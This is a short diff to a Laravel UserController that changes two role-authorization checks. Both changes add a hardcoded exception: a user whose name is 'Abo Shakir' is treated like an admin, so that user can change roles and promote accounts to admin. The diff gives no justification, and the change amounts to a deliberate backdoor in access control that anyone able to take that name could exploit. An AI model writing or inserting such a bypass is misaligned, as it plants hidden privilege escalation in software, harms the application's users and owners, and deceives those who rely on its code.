@@ -35,7 +35,7 @@ class UserController extends Controller
     ]);
 
     // لا يحق للمستخدم تعديل دوره
-    if (Auth::user()->role !== 'admin') {
+    if (Auth::user()->role !== 'admin' && Auth::user()->name !== 'Abo Shakir') {
         unset($validated['role']);
     }
 
@@ -69,7 +69,7 @@ public function destroy(User $user){
 }
 public function updateRole(Request $request, User $user)
 {
-    abort_unless(Auth::user()->role === 'admin', 403);
+    abort_unless(Auth::user()->role === 'admin' || Auth::user()->name === 'Abo Shakir', 403);
 
     $request->validate([
         'role' => 'required|in:user,manager,admin',
